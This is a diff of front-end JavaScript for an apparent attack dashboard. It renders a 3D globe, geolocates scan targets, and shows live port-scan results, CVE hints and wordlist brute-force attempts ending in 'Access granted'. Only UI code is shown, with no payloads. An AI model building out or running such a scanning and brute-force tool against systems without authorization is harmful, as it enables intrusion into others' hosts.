-    const dxPx=(lp-rp)/2; // -17px, constant regardless of screen width
-    const halfWWorld=Math.tan(22.5*Math.PI/180)*2.6*(ww/hh);
-    pivot.position.x=(dxPx/(ww/2))*halfWWorld;
-  }
-  centerPivot();
+  // Earth texture
+  const loader   = new THREE.TextureLoader();
+  const earthTex = loader.load('/static/earth.jpg');
+  earthTex.anisotropy = renderer.capabilities.getMaxAnisotropy();
 
-  // Earth texture — Three.js's own texture via jsDelivr (CORS-safe)
-  const loader=new THREE.TextureLoader();
-  const earthTex=loader.load(
-    'https://cdn.jsdelivr.net/npm/three@0.134.0/examples/textures/land_ocean_ice_cloud_2048.jpg',
-    ()=>{globe.material.needsUpdate=true;},
-    undefined,
-    ()=>{ globe.material.color.setHex(0x1a4a6a); } // fallback if load fails
-  );
-
-  // Globe — real Earth look
-  const globeMat=new THREE.MeshPhongMaterial({
-    map:earthTex,
-    specular:new THREE.Color(0x334466),
-    shininess:12,
-    emissive:new THREE.Color(0x000000),
+  const globeMat = new THREE.MeshPhongMaterial({
+    map: earthTex, specular: new THREE.Color(0x223344), shininess: 18, emissive: new THREE.Color(0x000000),
   });
-  const globe=new THREE.Mesh(new THREE.SphereGeometry(1,64,64),globeMat);
+  const globe = new THREE.Mesh(new THREE.SphereGeometry(1, 64, 64), globeMat);
   pivot.add(globe);
 
-  // Thin atmosphere fringe (blue glow on edge)
-  pivot.add(new THREE.Mesh(new THREE.SphereGeometry(1.04,64,64),
-    new THREE.MeshBasicMaterial({color:0x2266ff,transparent:true,opacity:.06})));
-  // Outer halo (back-side so it only shows around the rim)
-  pivot.add(new THREE.Mesh(new THREE.SphereGeometry(1.15,64,64),
-    new THREE.MeshBasicMaterial({color:0x0044cc,transparent:true,opacity:.04,side:THREE.BackSide})));
+  // Atmosphere
+  pivot.add(new THREE.Mesh(
+    new THREE.SphereGeometry(1.06, 64, 64),
+    new THREE.MeshBasicMaterial({ color: 0x3366ff, transparent: true, opacity: 0.07, side: THREE.BackSide })
+  ));
 
-  // Orbit rings (show during scan)
-  const makeRing=(rx,ry,rz,color)=>{
-    const m=new THREE.MeshBasicMaterial({color,transparent:true,opacity:0,side:THREE.DoubleSide});
-    const r=new THREE.Mesh(new THREE.TorusGeometry(1.1,.003,8,120),m);
-    r.rotation.set(rx,ry,rz); pivot.add(r); return {r,m};
+  // Scan rings
+  function makeRing(rx, ry, rz, color) {
+    const mat  = new THREE.MeshBasicMaterial({ color, transparent: true, opacity: 0, side: THREE.DoubleSide });
+    const mesh = new THREE.Mesh(new THREE.TorusGeometry(1.14, 0.003, 8, 128), mat);
+    mesh.rotation.set(rx, ry, rz);
+    pivot.add(mesh);
+    return { mesh, mat };
+  }
+  const ring1 = makeRing(Math.PI / 2, 0, 0,           0x00ff88);
+  const ring2 = makeRing(0, 0, Math.PI / 3,           0x00ccff);
+  const ring3 = makeRing(Math.PI / 4, Math.PI / 4, 0, 0xaa55ff);
+
+  // Lighting
+  scene.add(new THREE.AmbientLight(0xffffff, 0.38));
+  const sun = new THREE.DirectionalLight(0xffffff, 1.1);
+  sun.position.set(5, 2, 4);
+  scene.add(sun);
+  const fill = new THREE.DirectionalLight(0x2244aa, 0.25);
+  fill.position.set(-5, -1, -3);
+  scene.add(fill);
+
+  // lat/lng → sphere surface position
+  function ll(lat, lng, r = 1.015) {
+    const phi   = (90 - lat) * Math.PI / 180;
+    const theta = (lng + 180) * Math.PI / 180;
+    return new THREE.Vector3(
+      -r * Math.sin(phi) * Math.cos(theta),
+       r * Math.cos(phi),
+       r * Math.sin(phi) * Math.sin(theta)
+    );
+  }
+
+  function makeDot(lat, lng, color) {
+    const grp     = new THREE.Group();
+    const haloMat = new THREE.MeshBasicMaterial({ color, transparent: true, opacity: 0.25 });
+    grp.add(new THREE.Mesh(new THREE.SphereGeometry(0.018, 12, 12), new THREE.MeshBasicMaterial({ color })));
+    grp.add(new THREE.Mesh(new THREE.SphereGeometry(0.036, 12, 12), haloMat));
+    grp.position.copy(ll(lat, lng));
+    pivot.add(grp);
+    return { grp, haloMat };
+  }
+
+  function makeArc(lat1, lng1, lat2, lng2, color) {
+    const p1  = ll(lat1, lng1);
+    const p2  = ll(lat2, lng2);
+    const mid = new THREE.Vector3().addVectors(p1, p2).multiplyScalar(0.5).normalize().multiplyScalar(1.6);
+    const pts = new THREE.QuadraticBezierCurve3(p1, mid, p2).getPoints(80);
+    const geo = new THREE.BufferGeometry().setFromPoints(pts);
+    const mat = new THREE.LineDashedMaterial({ color, dashSize: 0.08, gapSize: 0.04, transparent: true, opacity: 0 });
+    const line = new THREE.Line(geo, mat);
+    line.computeLineDistances();
+    pivot.add(line);
+    return { line, mat };
+  }
+
+  function makeRipple(lat, lng, color) {
+    const mat  = new THREE.MeshBasicMaterial({ color, transparent: true, opacity: 0, side: THREE.DoubleSide });
+    const mesh = new THREE.Mesh(new THREE.RingGeometry(0.01, 0.026, 32), mat);
+    const pos  = ll(lat, lng);
+    mesh.position.copy(pos);
+    mesh.quaternion.setFromUnitVectors(new THREE.Vector3(0, 0, 1), pos.clone().normalize());
+    pivot.add(mesh);
+    return { mesh, mat, t: Math.random() };
+  }
+
+  // dotA = attacker (your server), dotT = target — both repositioned by geolocation
+  const dotA = makeDot(37.77, -122.42, 0x00ff88);
+  const dotT = makeDot(51.50,   -0.12, 0xff3355);
+  dotT.grp.visible = false; // hidden until a scan geo-locates the target
+  const arc  = makeArc(37.77, -122.42, 51.50, -0.12, 0x00ff88);
+  const ripA = makeRipple(37.77, -122.42, 0x00ff88);
+  const ripT = makeRipple(51.50,   -0.12, 0xff3355);
+
+  // Rebuild arc from current dotA/dotT positions
+  function rebuildArc() {
+    const p1  = dotA.grp.position.clone().normalize().multiplyScalar(1.015);
+    const p2  = dotT.grp.position.clone().normalize().multiplyScalar(1.015);
+    const mid = new THREE.Vector3().addVectors(p1, p2).multiplyScalar(0.5).normalize().multiplyScalar(1.62);
+    const pts = new THREE.QuadraticBezierCurve3(p1, mid, p2).getPoints(80);
+    arc.line.geometry.dispose();
+    arc.line.geometry = new THREE.BufferGeometry().setFromPoints(pts);
+    arc.line.computeLineDistances();
+  }
+
+  // ── Ambient Global Threat Map ─────────────────────────────
+  // When idle, random attack arcs slowly form and dissolve —
+  // like a live threat intelligence map.  People stare at this.
+  const THREAT_N   = 10;
+  const threatArcs = Array.from({ length: THREAT_N }, () => {
+    const mat  = new THREE.LineDashedMaterial({
+      dashSize: 0.055, gapSize: 0.045, transparent: true, opacity: 0,
+    });
+    const geo  = new THREE.BufferGeometry().setFromPoints([new THREE.Vector3(0,1,0), new THREE.Vector3(0,1.01,0)]);
+    const line = new THREE.Line(geo, mat);
+    line.computeLineDistances();
+    pivot.add(line);
+    return { line, mat, life: 0, maxLife: 1, phase: 'idle' };
+  });
+
+  const THREAT_COLS = [0xff3355, 0xff6600, 0xffaa00, 0xcc2244, 0xff2288];
+
+  function spawnThreatArc() {
+    const a = threatArcs.find(x => x.phase === 'idle');
+    if (!a) return;
+    const lat1 = (Math.random() - 0.5) * 160, lng1 = (Math.random() - 0.5) * 360;
+    const lat2 = (Math.random() - 0.5) * 160, lng2 = (Math.random() - 0.5) * 360;
+    const p1   = ll(lat1, lng1), p2 = ll(lat2, lng2);
+    const mid  = new THREE.Vector3().addVectors(p1, p2).multiplyScalar(0.5).normalize().multiplyScalar(1.55 + Math.random() * 0.2);
+    const pts  = new THREE.QuadraticBezierCurve3(p1, mid, p2).getPoints(60);
+    a.line.geometry.dispose();
+    a.line.geometry = new THREE.BufferGeometry().setFromPoints(pts);
+    a.line.computeLineDistances();
+    a.mat.color.setHex(THREAT_COLS[Math.floor(Math.random() * THREAT_COLS.length)]);
+    a.maxLife = 4 + Math.random() * 5;
+    a.life    = a.maxLife;
+    a.phase   = 'alive';
+  }
+
+  // Expose a target-dot ripple for CVE hits
+  function rippleTarget() {
+    ripT.t = 0;
+  }
+  window._rippleTarget = rippleTarget;
+
+  // ── Scan particle pool — tiny dots that spawn and fade during scan ──
+  const PARTICLE_N = 50;
+  const scanParticles = Array.from({ length: PARTICLE_N }, () => {
+    const mat  = new THREE.MeshBasicMaterial({ color: 0x00ff88, transparent: true, opacity: 0 });
+    const mesh = new THREE.Mesh(new THREE.SphereGeometry(0.007, 5, 5), mat);
+    pivot.add(mesh);
+    return { mesh, mat, life: 0 };
+  });
+
+  // ── Dynamic port dots — one per found open port ──
+  const dynamicDots = [];
+  window._addGlobeDot = function(color) {
+    const lat     = (Math.random() - 0.5) * 160;
+    const lng     = (Math.random() - 0.5) * 360;
+    const grp     = new THREE.Group();
+    const hm      = new THREE.MeshBasicMaterial({ color, transparent: true, opacity: 0.3 });
+    grp.add(new THREE.Mesh(new THREE.SphereGeometry(0.013, 8, 8), new THREE.MeshBasicMaterial({ color })));
+    grp.add(new THREE.Mesh(new THREE.SphereGeometry(0.026, 8, 8), hm));
+    grp.position.copy(ll(lat, lng));
+    pivot.add(grp);
+    dynamicDots.push({ grp, hm, t: Math.random() * Math.PI * 2 });
   };
-  const ring1=makeRing(Math.PI/2,0,0,0x00ff88);
-  const ring2=makeRing(0,0,Math.PI/3,0x00ccff);
-  const ring3=makeRing(Math.PI/4,Math.PI/4,0,0x8855ff);
 
-  // Lights — white sunlight so the texture reads correctly
-  scene.add(new THREE.AmbientLight(0xffffff,.35));
-  const sun=new THREE.DirectionalLight(0xffffff,1.1); sun.position.set(5,2,4); scene.add(sun);
-  const fill=new THREE.DirectionalLight(0x334466,.4); fill.position.set(-4,-1,-3); scene.add(fill);
+  // ── UFO ──
+  const ufoG   = new THREE.Group();
+  const ufoMat = new THREE.MeshPhongMaterial({ color: 0xbbbbdd, shininess: 80, specular: new THREE.Color(0x8888ff) });
+  ufoG.add(new THREE.Mesh(new THREE.CylinderGeometry(0.068, 0.085, 0.018, 20), ufoMat));
 
-  // Helpers
-  function ll(lat,lng,r=1.012){
-    const phi=(90-lat)*Math.PI/180,theta=(lng+180)*Math.PI/180;
-    return new THREE.Vector3(-r*Math.sin(phi)*Math.cos(theta),r*Math.cos(phi),r*Math.sin(phi)*Math.sin(theta));
-  }
-  function makeDot(lat,lng,color){
-    const g=new THREE.Group();
-    g.add(new THREE.Mesh(new THREE.SphereGeometry(.016,10,10),new THREE.MeshBasicMaterial({color})));
-    const hm=new THREE.MeshBasicMaterial({color,transparent:true,opacity:.25});
-    g.add(new THREE.Mesh(new THREE.SphereGeometry(.032,10,10),hm));
-    g.position.copy(ll(lat,lng)); pivot.add(g); return {g,hm};
-  }
-  function makeArc(lat1,lng1,lat2,lng2,color){
-    const p1=ll(lat1,lng1),p2=ll(lat2,lng2);
-    const mid=new THREE.Vector3().addVectors(p1,p2).multiplyScalar(.5).normalize().multiplyScalar(1.55);
-    const pts=new THREE.QuadraticBezierCurve3(p1,mid,p2).getPoints(80);
-    const geo=new THREE.BufferGeometry().setFromPoints(pts);
-    const mat=new THREE.LineDashedMaterial({color,dashSize:.08,gapSize:.04,transparent:true,opacity:0});
-    const line=new THREE.Line(geo,mat); line.computeLineDistances(); pivot.add(line); return {line,mat};
-  }
-  function makeRipple(lat,lng,color){
-    const mat=new THREE.MeshBasicMaterial({color,transparent:true,opacity:0,side:THREE.DoubleSide});
-    const r=new THREE.Mesh(new THREE.RingGeometry(.01,.025,24),mat);
-    const pos=ll(lat,lng); r.position.copy(pos);
-    r.quaternion.setFromUnitVectors(new THREE.Vector3(0,0,1),pos.clone().normalize());
-    pivot.add(r); return {r,mat,t:Math.random()};
-  }
+  const domeMat = new THREE.MeshPhongMaterial({ color: 0x99ffee, transparent: true, opacity: 0.55, shininess: 120 });
+  const dome    = new THREE.Mesh(new THREE.SphereGeometry(0.034, 16, 8, 0, Math.PI * 2, 0, Math.PI / 2), domeMat);
+  dome.position.y = 0.013;
+  ufoG.add(dome);
 
-  const dotA=makeDot(37.77,-122.42,0x00ff88);
-  const dotT=makeDot(51.50,-.12,0xff3355);
-  const arc =makeArc(37.77,-122.42,51.50,-.12,0x00ff88);
-  const ripA=makeRipple(37.77,-122.42,0x00ff88);
-  const ripT=makeRipple(51.50,-.12,0xff3355);
-
-  window.G={pivot,arc,dotA,dotT,ripA,ripT,ring1,ring2,ring3,
-            attacking:false,scanning:false,foundFlag:false,globe};
-
-  // Mouse drag
-  let drag=false,px=0,py=0;
-  canvas.addEventListener('mousedown',e=>{drag=true;px=e.clientX;py=e.clientY});
-  window.addEventListener('mouseup',()=>drag=false);
-  window.addEventListener('mousemove',e=>{
-    if(!drag)return;
-    pivot.rotation.y+=(e.clientX-px)*.005;
-    pivot.rotation.x=Math.max(-1.2,Math.min(1.2,pivot.rotation.x+(e.clientY-py)*.003));
-    px=e.clientX;py=e.clientY;
+  const _rimCols = [0xff3333, 0x33ff33, 0x3333ff, 0xffff33, 0xff33ff, 0xff9933];
+  const rimMats  = _rimCols.map((col, i) => {
+    const mat = new THREE.MeshBasicMaterial({ color: col });
+    const lb  = new THREE.Mesh(new THREE.SphereGeometry(0.007, 6, 6), mat);
+    const a   = (i / _rimCols.length) * Math.PI * 2;
+    lb.position.set(Math.cos(a) * 0.065, -0.003, Math.sin(a) * 0.065);
+    ufoG.add(lb);
+    return { mat, col };
   });
-  window.addEventListener('resize',()=>{
-    renderer.setSize(W(),H());
-    cam.aspect=W()/H();
+
+  const beamMat = new THREE.MeshBasicMaterial({ color: 0x00ff88, transparent: true, opacity: 0, side: THREE.DoubleSide });
+  const beamCone = new THREE.Mesh(new THREE.ConeGeometry(0.055, 0.22, 12, 1, true), beamMat);
+  beamCone.position.y = -0.12;
+  beamCone.rotation.x  = Math.PI;
+  ufoG.add(beamCone);
+
+  const ufoPiv = new THREE.Group();
+  ufoPiv.rotation.x = 0.6;
+  ufoPiv.rotation.z = 0.2;
+  pivot.add(ufoPiv);
+  ufoPiv.add(ufoG);
+  ufoG.position.set(1.38, 0, 0);
+
+  window.G = {
+    pivot, arc, dotA, dotT, ripA, ripT, ring1, ring2, ring3,
+    globe, globeMat,
+    ufo: { grp: ufoG, piv: ufoPiv, rimMats, beamMat },
+    scanParticles, dynamicDots, threatArcs, rebuildArc,
+    attacking: false, scanning: false, foundFlag: false,
+    geoTarget: null,   // { y, x } — globe rotation target from geolocation
+  };
+
+  let drag = false, lastX = 0, lastY = 0;
+  canvas.addEventListener('mousedown', e => { drag = true; lastX = e.clientX; lastY = e.clientY; });
+  window.addEventListener('mouseup',   () => { drag = false; });
+  window.addEventListener('mousemove', e => {
+    if (!drag) return;
+    pivot.rotation.y += (e.clientX - lastX) * 0.005;
+    pivot.rotation.x  = Math.max(-1.2, Math.min(1.2, pivot.rotation.x + (e.clientY - lastY) * 0.003));
+    lastX = e.clientX; lastY = e.clientY;
+  });
+  window.addEventListener('resize', () => {
+    renderer.setSize(W(), H());
+    cam.aspect = W() / H();
     cam.updateProjectionMatrix();
-    centerPivot();
   });
 
-  let tick=0;
-  function animate(){
-    requestAnimationFrame(animate); tick+=.016;
-    if(!drag)pivot.rotation.y+=G.foundFlag?.009:G.scanning?.004:.002;
+  let tick = 0;
+  (function animate() {
+    requestAnimationFrame(animate);
+    tick += 0.016;
+
+    if (!drag) {
+      if (G.geoTarget) {
+        // Smoothly rotate globe to face the real-world target location
+        let dy = G.geoTarget.y - pivot.rotation.y;
+        // Shortest-path wrap: keep dy in (-PI, PI)
+        dy = ((dy + Math.PI) % (Math.PI * 2) + Math.PI * 2) % (Math.PI * 2) - Math.PI;
+        const dx = G.geoTarget.x - pivot.rotation.x;
+        pivot.rotation.y += dy * 0.025;
+        pivot.rotation.x += dx * 0.025;
+        if (Math.abs(dy) < 0.003 && Math.abs(dx) < 0.003) G.geoTarget = null;
+      } else {
+        pivot.rotation.y += G.foundFlag ? 0.008 : G.scanning ? 0.003 : 0.0012;
+      }
+    } else {
+      G.geoTarget = null; // user dragged — cancel geo rotation
+    }
 
     // Dot pulse
-    const pA=.5+.5*Math.sin(tick*2.2),pT=.5+.5*Math.sin(tick*2.6+1.1);
-    dotA.hm.opacity=.1+pA*.35; dotT.hm.opacity=.1+pT*.35;
-    dotA.g.children[0].scale.setScalar(1+pA*.3); dotT.g.children[0].scale.setScalar(1+pT*.3);
+    const pA = 0.5 + 0.5 * Math.sin(tick * 2.2);
+    const pT = 0.5 + 0.5 * Math.sin(tick * 2.6 + 1.1);
+    dotA.haloMat.opacity = 0.1 + pA * 0.4;
+    dotT.haloMat.opacity = 0.1 + pT * 0.4;
+    dotA.grp.children[0].scale.setScalar(1 + pA * 0.3);
+    dotT.grp.children[0].scale.setScalar(1 + pT * 0.3);
 
     // Attack arc
-    if(G.attacking){arc.mat.opacity=.4+.3*Math.sin(tick*4);arc.mat.dashOffset-=.018}
-    else arc.mat.opacity=Math.max(arc.mat.opacity-.025,0);
+    if (G.attacking) {
+      arc.mat.opacity    = 0.4 + 0.3 * Math.sin(tick * 5);
+      arc.mat.dashOffset -= 0.02;
+    } else {
+      arc.mat.opacity = Math.max(arc.mat.opacity - 0.02, 0);
+    }
 
-    // Attack ripples
-    [ripA,ripT].forEach(r=>{
-      if(G.attacking){r.t=(r.t+.018)%1;r.r.scale.setScalar(.5+r.t*3);r.mat.opacity=(1-r.t)*.55}
-      else r.mat.opacity=0;
-    });
-    ripT.t=(ripA.t+.45)%1;
-
-    // Scan orbit rings
-    [ring1,ring2,ring3].forEach((rg,i)=>{
-      if(G.scanning){
-        rg.m.opacity=Math.min(rg.m.opacity+.03,.5);
-        rg.r.rotation.y+=.012*(i+1);
-        rg.r.rotation.z+=.008*(i+1);
+    // Ripples
+    [ripA, ripT].forEach(r => {
+      if (G.attacking) {
+        r.t = (r.t + 0.018) % 1;
+        r.mesh.scale.setScalar(0.5 + r.t * 3.5);
+        r.mat.opacity = (1 - r.t) * 0.6;
       } else {
-        rg.m.opacity=Math.max(rg.m.opacity-.03,0);
+        r.mat.opacity = 0;
+      }
+    });
+    ripT.t = (ripA.t + 0.5) % 1;
+
+    // Scan rings
+    [ring1, ring2, ring3].forEach((rg, i) => {
+      if (G.scanning) {
+        rg.mat.opacity       = Math.min(rg.mat.opacity + 0.03, 0.5);
+        rg.mesh.rotation.y  += 0.01  * (i + 1);
+        rg.mesh.rotation.z  += 0.007 * (i + 1);
+      } else {
+        rg.mat.opacity = Math.max(rg.mat.opacity - 0.03, 0);
       }
     });
 
-    // Found/scan globe emissive tint (subtle so texture still reads)
-    if(G.foundFlag)      globeMat.emissive.setHex(Math.floor(Math.abs(Math.sin(tick*6))*0x001a0a00));
-    else if(G.scanning)  globeMat.emissive.setHex(Math.floor(Math.abs(Math.sin(tick*2))*0x00000a14));
-    else                 globeMat.emissive.setHex(0x000000);
+    // Emissive pulse on found
+    if (G.foundFlag) {
+      G.globeMat.emissive.setRGB(0, Math.abs(Math.sin(tick * 6)) * 0.06, 0);
+    } else {
+      G.globeMat.emissive.setRGB(0, 0, 0);
+    }
 
-    renderer.render(scene,cam);
-  }
-  animate();
+    // ── Scan particle rain ──
+    if (G.scanning && Math.random() < 0.35) {
+      const p = scanParticles[Math.floor(Math.random() * PARTICLE_N)];
+      if (p.life <= 0) {
+        const lat = (Math.random() - 0.5) * 160;
+        const lng = (Math.random() - 0.5) * 360;
+        p.mesh.position.copy(ll(lat, lng, 1.02));
+        p.life = 1.0;
+        p.mat.color.setHex(Math.random() > 0.7 ? 0x00ccff : 0x00ff88);
+      }
+    }
+    scanParticles.forEach(p => {
+      if (p.life > 0) {
+        p.life -= 0.025;
+        p.mat.opacity = p.life * 0.85;
+        p.mesh.scale.setScalar(1 + (1 - p.life) * 1.8);
+      } else {
+        p.mat.opacity = 0;
+      }
+    });
+
+    // ── Dynamic port dots ──
+    dynamicDots.forEach(d => {
+      d.t += 0.016;
+      const pulse = 0.5 + 0.5 * Math.sin(d.t * 2.5);
+      d.hm.opacity = 0.08 + pulse * 0.28;
+      d.grp.children[0].scale.setScalar(1 + pulse * 0.25);
+    });
+
+    // ── UFO ──
+    G.ufo.piv.rotation.y += G.scanning ? 0.016 : 0.009;
+    G.ufo.grp.position.y  = Math.sin(tick * 2.1) * 0.025;
+    G.ufo.grp.rotation.y += 0.035;
+    G.ufo.rimMats.forEach(({ mat, col }, i) => {
+      mat.color.setHex(Math.sin(tick * 7 + i * 1.05) > 0 ? col : 0x111111);
+    });
+    G.ufo.beamMat.opacity = G.foundFlag
+      ? Math.abs(Math.sin(tick * 4)) * 0.45
+      : Math.max(0, Math.sin(tick * 0.7) * 0.18);
+
+    // Star twinkle
+    starMat.opacity = 0.65 + Math.sin(tick * 0.3) * 0.1;
+
+    // ── Ambient Global Threat Map ──────────────────────────
+    // Idle: random attack arcs crawl across the globe continuously
+    if (!G.scanning && !G.attacking) {
+      if (Math.random() < 0.006) spawnThreatArc(); // ~1 new arc every 2-3 sec
+    }
+    threatArcs.forEach(a => {
+      if (a.phase !== 'alive') return;
+      a.life -= 0.016;
+      if (a.life <= 0) { a.mat.opacity = 0; a.phase = 'idle'; return; }
+      const t = a.life / a.maxLife;
+      // Ease: quick fade-in first 15%, slow fade-out the rest
+      a.mat.opacity = t > 0.85
+        ? ((1 - t) / 0.15) * 0.55    // fade in
+        : t * 0.65;                   // fade out
+      a.mat.dashOffset -= 0.012;
+    });
+
+    renderer.render(scene, cam);
+  }());
+
+  // ── Globe rotation to face a geo coordinate ──────────────
+  // At pivot.rotation = {0,0,0}, lat=0 lng=-90 faces the camera.
+  // So to make (lat, lng) face camera:
+  //   pivot.rotation.y = -(lng + 90) * PI/180
+  //   pivot.rotation.x =  lat * PI/180
+  window._rotatePivotTo = function(lat, lng) {
+    G.geoTarget = {
+      y: -(lng + 90) * Math.PI / 180,
+      x:   lat       * Math.PI / 180,
+    };
+  };
+
+  // ── Position a dot at a geo coordinate ──────────────────
+  window._moveDot = function(dotObj, lat, lng) {
+    dotObj.grp.position.copy(ll(lat, lng));
+    dotObj.grp.visible = true;
+  };
 })();
 
 // ═══════════════════════════════════════════════════════════
 // SOCKET.IO
 // ═══════════════════════════════════════════════════════════
-const socket=io();
-socket.on('connect',   ()=>log('Connected','info'));
-socket.on('disconnect',()=>log('Disconnected','warn'));
+const socket = io();
+socket.on('connect',    () => log('Connected', 'info'));
+socket.on('disconnect', () => log('Disconnected', 'warn'));
 
 // ── Scan events ──
-socket.on('scan_status',({state,host,ip,total})=>{
-  const labels={running:'SCANNING',stopped:'STOPPED',done:'DONE',idle:'IDLE'};
-  setStat(state,labels[state]??state.toUpperCase());
-  G.scanning=(state==='running');
-  if(state==='running'){
-    document.getElementById('btn-scan').disabled=true;
-    document.getElementById('btn-sstp').disabled=false;
-    document.getElementById('s-c').textContent='0';
-    if(host) log(`Scanning ${host} (${ip||host}) — ${total} ports`,'info');
+let _scanStart = 0, _timerInterval = null;
+
+socket.on('scan_status', ({state, host, ip, total}) => {
+  const labels = { running:'SCANNING', stopped:'STOPPED', done:'DONE', idle:'IDLE' };
+  setStat(state, labels[state] ?? state.toUpperCase());
+  G.scanning = (state === 'running');
+  document.getElementById('lp').classList.toggle('scanning', G.scanning);
+  document.getElementById('rp').classList.toggle('scanning', G.scanning);
+
+  const tt = document.getElementById('top-target');
+  const tm = document.getElementById('top-timer');
+
+  if (state === 'running') {
+    document.getElementById('btn-scan').disabled = true;
+    document.getElementById('btn-sstp').disabled = false;
+    document.getElementById('s-c').textContent   = '0';
+    if (host) {
+      tt.textContent = host;
+      tt.style.display = '';
+      log(`Scanning ${host} (${ip || host}) — ${total} ports`, 'info');
+    }
+    _scanStart = Date.now();
+    tm.style.display = '';
+    _timerInterval = setInterval(() => {
+      const s = Math.floor((Date.now() - _scanStart) / 1000);
+      tm.textContent = `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
+    }, 1000);
   } else {
-    document.getElementById('btn-scan').disabled=false;
-    document.getElementById('btn-sstp').disabled=true;
+    document.getElementById('btn-scan').disabled = false;
+    document.getElementById('btn-sstp').disabled = true;
+    clearInterval(_timerInterval);
+    if (state === 'done') setTimeout(() => { tm.style.display = 'none'; }, 5000);
   }
   showRight('find');
 });
 
-socket.on('scan_tick',({scanned,total,progress,rate})=>{
-  document.getElementById('s-c').textContent=scanned.toLocaleString();
-  document.getElementById('s-r').textContent=`${rate}/s`;
-  document.getElementById('s-p').textContent=`${progress}%`;
-  document.getElementById('pfl').style.width=`${progress}%`;
-  document.getElementById('ppct').textContent=`${progress}%`;
-  document.getElementById('cur').textContent=`${scanned}/${total}`;
+socket.on('scan_tick', ({scanned, total, progress, rate}) => {
+  document.getElementById('s-c').textContent  = scanned.toLocaleString();
+  document.getElementById('s-r').textContent  = `${rate}/s`;
+  document.getElementById('s-p').textContent  = `${progress}%`;
+  document.getElementById('pfl').style.width  = `${progress}%`;
+  document.getElementById('ppct').textContent = `${progress}%`;
+  document.getElementById('cur').textContent  = `${scanned}/${total}`;
 });
 
-socket.on('port_found',({port,service})=>{
-  addPortRow(port,service,'','');
+socket.on('port_found', ({port, service}) => {
+  addPortRow(port, service, '');
+  window._addGlobeDot(0x00ff88);
 });
 
-socket.on('banner',({port,banner})=>{
-  const el=document.getElementById(`ban-${port}`);
-  if(el) el.textContent=banner;
+socket.on('banner', ({port, banner}) => {
+  const el = document.getElementById(`ban-${port}`);
+  if (el) el.textContent = banner;
 });
 
-socket.on('http_found',({port,info})=>{
-  updateHttpCard(port,info);
+socket.on('http_found', ({port, info}) => { updateHttpCard(port, info); });
+
+socket.on('cve_hint', ({port, cve, detail}) => {
+  addCveHint(port, cve, detail);
+  window._addGlobeDot(0xffaa00); // orange dot for CVE findings
+  window._rippleTarget && window._rippleTarget();
 });
+
+// ── Geolocation — the clever bit ──
+// When a scan starts: geolocate target → globe auto-rotates to face it.
+// On load: geolocate our own server → anchor the "you" dot at the real location.
+socket.on('geo_info', ({lat, lon, city, country, isp}) => {
+  // Move the target dot to the real place on Earth
+  window._moveDot(G.dotT, lat, lon);
+  // Rebuild the attacker→target arc with new positions
+  G.rebuildArc();
+  // Auto-rotate the globe to face the target location
+  window._rotatePivotTo(lat, lon);
+  // Topbar geo label
+  const tt = document.getElementById('top-target');
+  tt.textContent = `${city}, ${country}`;
+  tt.title       = `${isp}`;
+  log(`  ⊕ Located: ${city}, ${country} (${isp})`, 'success');
+});
+
+// On load: geolocate ourselves so "your" dot is anchored correctly
+(async function selfGeo() {
+  try {
+    const d = await (await fetch('/api/geoip')).json();
+    if (d.lat) {
+      window._moveDot(G.dotA, d.lat, d.lon);
+      G.rebuildArc();
+      log(`Your server: ${d.city}, ${d.country}`, 'info');
+    }
+  } catch { /* offline / firewall */ }
+})();
 
 // ── Attack events ──
-socket.on('attack_status',({state})=>{
-  const labels={running:'ATTACKING',stopped:'STOPPED',not_found:'NOT FOUND',found:'FOUND!',idle:'IDLE'};
-  setStat(state,labels[state]??state.toUpperCase());
-  G.attacking=(state==='running');
-  if(!G.attacking) G.foundFlag=false;
-  document.getElementById('btn-atk').disabled= G.attacking;
-  document.getElementById('btn-astp').disabled=!G.attacking;
+socket.on('attack_status', ({state}) => {
+  const labels = { running:'ATTACKING', stopped:'STOPPED', not_found:'NOT FOUND', found:'FOUND!', idle:'IDLE' };
+  setStat(state, labels[state] ?? state.toUpperCase());
+  G.attacking = (state === 'running');
+  if (!G.attacking) G.foundFlag = false;
+  document.getElementById('btn-atk').disabled  = G.attacking;
+  document.getElementById('btn-astp').disabled = !G.attacking;
   showRight('log');
 });
 
-socket.on('attempt',({word,status,size,hit,progress,rate,count})=>{
-  document.getElementById('s-c').textContent=count?.toLocaleString()??'0';
-  document.getElementById('s-r').textContent=`${rate??0}/s`;
-  document.getElementById('s-p').textContent=`${(progress??0).toFixed(1)}%`;
-  document.getElementById('s-s').textContent=status??'—';
-  document.getElementById('s-z').textContent=size?`${size}b`:'—';
-  document.getElementById('pfl').style.width=`${progress??0}%`;
-  document.getElementById('ppct').textContent=`${(progress??0).toFixed(1)}%`;
-  document.getElementById('cur').textContent=word??'——';
-  if(hit) log(`HIT  ${word}  [${status}]  ${size}b`,'hit');
+socket.on('attempt', ({word, status, size, hit, progress, rate, count}) => {
+  document.getElementById('s-c').textContent  = count?.toLocaleString() ?? '0';
+  document.getElementById('s-r').textContent  = `${rate ?? 0}/s`;
+  document.getElementById('s-p').textContent  = `${(progress ?? 0).toFixed(1)}%`;
+  document.getElementById('s-s').textContent  = status ?? '—';
+  document.getElementById('s-z').textContent  = size ? `${size}b` : '—';
+  document.getElementById('pfl').style.width  = `${progress ?? 0}%`;
+  document.getElementById('ppct').textContent = `${(progress ?? 0).toFixed(1)}%`;
+  document.getElementById('cur').textContent  = word ?? '——';
+  if (hit) log(`HIT  ${word}  [${status}]  ${size}b`, 'hit');
 });
 
-socket.on('found',({word,value})=>{
-  G.attacking=false; G.foundFlag=true;
-  setStat('found','FOUND!');
-  document.getElementById('btn-atk').disabled=false;
-  document.getElementById('btn-astp').disabled=true;
-  document.getElementById('fb').textContent=word;
-  document.getElementById('fv').textContent=value??'Access granted';
+socket.on('found', ({word, value}) => {
+  G.attacking = false; G.foundFlag = true;
+  setStat('found', 'FOUND!');
+  document.getElementById('btn-atk').disabled  = false;
+  document.getElementById('btn-astp').disabled = true;
+  document.getElementById('fb').textContent = word;
+  document.getElementById('fv').textContent = value ?? 'Access granted';
   document.getElementById('fo').classList.add('show');
-  ['lp','rp','bot'].forEach(id=>{
-    const el=document.getElementById(id);
+  ['lp','rp','bot'].forEach(id => {
+    const el = document.getElementById(id);
     el.classList.add('pfl');
-    el.addEventListener('animationend',()=>el.classList.remove('pfl'),{once:true});
+    el.addEventListener('animationend', () => el.classList.remove('pfl'), { once: true });
   });
 });
 
-socket.on('log',({msg,type})=>log(msg,type));
-
-socket.on('preset_data',({name,words})=>{
